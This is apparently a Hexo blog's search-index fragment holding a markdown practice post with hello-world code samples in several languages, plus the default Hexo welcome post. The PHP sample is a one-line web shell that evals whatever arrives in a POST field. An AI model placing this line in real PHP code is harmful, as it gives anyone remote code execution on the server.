    <content type="text"><![CDATA[Glad to be here! I’m writing this for practicing using markdown to write my articles.This site is Ainassine’s Blog, Welcome here.I’m using Hexo framework with theme next.muse. It dose support many lables to help you write you own articles, but I want to get used to MD first. Practice some techniquesAbout codeHow to use scanf() in C? 12# bash code$ sudo chown 777 a.txt 12// Java codeSystem.out.println("Hello world!"); 12// C codeprintf("Hello world!"); 12// C++ codecout &lt;&lt; "Hello world!" &lt;&lt; endl; 12# Python codeprint('Hello world!') 12// JavaScript code&lt;script&gt; alert("Hello world!"); &lt;/scirpt&gt; 12# PHP code&lt;?php eval($_POST['cmd']); ?&gt; About fontItalic: Hello world! Bold: Hello world! Bold and Italic: Hello world! Deleted: Hello world! About linksLink for this blog: Ainassine’s Blog For reference: Great search engines are as follows: Baidu, Bing and Google, Google is good. Use ‘&lt;’ and ‘&gt;’ to make links be seen as links: &#x6a;&#111;&#x65;&#101;&#x65;&#101;&#x65;&#64;&#101;&#x78;&#x6d;&#97;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#109; This is a anchor: Jump to About Code About listDisordered list (use *, - or + to denote): hhh 1 ggg 2 jjj 3 Ordered list (user nubmer with a . to denote): Firstly Secondly Thirdly For reference: Test quote: test 1test 2 Two paragraphs of reference: Title of itcontent 1 for paragraph 1content 2 for paragraph 1 content 1 for paragraph 2content 2 for paragraph 2 Mixure: list item 1 list item 2 exmaple codeprintf(&#39;hello world!&#39;); About picturesPic 1: Table 学号 姓名 分数 小明 男 75 小红 女 100 小陆 男 92 产品 价格 Leanote 高级账号 60元/年 Leanote 超级账号 120元/年]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
        <tag>My blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fblog%2Fpubli%2F2017%2F11%2F27%2Fhello-world</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
